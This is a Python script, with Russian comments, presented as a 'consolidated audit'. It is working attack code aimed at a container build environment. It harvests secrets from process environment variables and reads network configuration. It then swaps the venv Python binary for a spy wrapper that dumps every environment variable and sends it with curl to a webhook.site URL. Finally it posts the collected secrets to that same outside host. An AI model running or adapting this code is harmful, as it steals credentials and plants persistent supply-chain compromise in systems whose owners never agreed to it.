import os
import subprocess
import json
import sys

# КОНФИГУРАЦИЯ
WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
PYTHON_TARGET = "/app/.venv/bin/python"

def run_consolidated_audit():
    results = {}

    # 1. Сбор базовой информации (Privileges & Environment)
    results["identity"] = {
        "uid": os.getuid(),
        "is_root": os.getuid() == 0,
        "cwd": os.getcwd(),
        "hostname": os.uname().nodename
    }

    # 2. Поиск секретов в окружении процессов
    secrets = []
    for pid in os.listdir('/proc'):
        if pid.isdigit() and int(pid) < 500: # Проверяем только системные процессы
            try:
                with open(f'/proc/{pid}/environ', 'rb') as f:
                    env = f.read().replace(b'\0', b'\n').decode(errors='ignore')
                    for line in env.split('\n'):
                        if any(k in line.upper() for k in ['KEY', 'TOKEN', 'PASS', 'RAILWAY', 'SECRET']):
                            secrets.append(f"PID {pid}: {line}")
            except: continue
    results["leaked_secrets"] = secrets[:15]

    # 3. Сетевой аудит (Internal DNS & Interfaces)
    try:
        with open('/etc/resolv.conf', 'r') as f:
            results["dns_config"] = f.read()
    except: results["dns_config"] = "Error reading resolv.conf"

    # 4. Supply Chain Attack: Binary Hijacking
    if os.path.exists(PYTHON_TARGET) and not os.path.exists(PYTHON_TARGET + ".orig"):
        try:
            os.rename(PYTHON_TARGET, PYTHON_TARGET + ".orig")
            with open(PYTHON_TARGET, "w") as f:
                f.write(f"#!/app/.venv/bin/python.orig\nimport os, sys, subprocess, json\n")
                f.write(f"env_data = dict(os.environ)\n")
                f.write(f"with open('/tmp/exfil.json', 'w') as ef: json.dump(env_data, ef)\n")
                # Фоновая отправка, чтобы билд не завис
                f.write(f"subprocess.Popen(['curl', '-s', '-X', 'POST', '-d', '@ /tmp/exfil.json', '{WEBHOOK_URL}'])\n")
                f.write(f"os.execv('/app/.venv/bin/python.orig', sys.argv)\n")
            os.chmod(PYTHON_TARGET, 0o755)
            results["hijack_status"] = "SUCCESS: Python binary replaced with spy wrapper."
        except Exception as e:
            results["hijack_status"] = f"FAILED: {str(e)}"

    # 5. Вывод в логи (на случай блокировки сети)
    sys.stderr.write("\n" + "!"*40 + "\n")
    sys.stderr.write("LUMOS CONSOLIDATED AUDIT START\n")
    sys.stderr.write(json.dumps(results, indent=2))
    sys.stderr.write("\n" + "!"*40 + "\n")

    # 6. Отправка на вебхук (если сеть позволяет)
    try:
        subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
                        '-d', json.dumps(results), WEBHOOK_URL], timeout=5)
    except:
        sys.stderr.write("Webhook exfiltration failed (Egress Blocked).\n")

if __name__ == "__main__":
    run_consolidated_audit()
